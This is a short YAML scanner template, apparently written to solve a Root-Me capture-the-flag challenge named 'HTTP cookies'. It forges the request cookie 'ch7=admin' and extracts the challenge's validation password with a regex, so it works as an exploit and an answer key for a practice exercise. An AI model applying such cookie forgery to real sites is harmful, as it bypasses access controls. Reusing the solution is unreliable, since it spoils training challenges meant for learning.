id: HTTP-cookies
info:
  author: Tomitom13
  name: HTTP cookies
  severity: unknown
  tags: cookies,http,rootme
requests:
- extractors:
  - name: password
    part: body
    regex:
    - 'password : [a-zA-Z0-9!@#$%^&*()_+\-,.<>?]+'
    type: regex
  headers:
    Cookie: ch7=admin
  matchers:
  - status:
    - 200
    type: status
  - part: body
    type: word
    words:
    - 'Validation password : '
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/?c=admin'
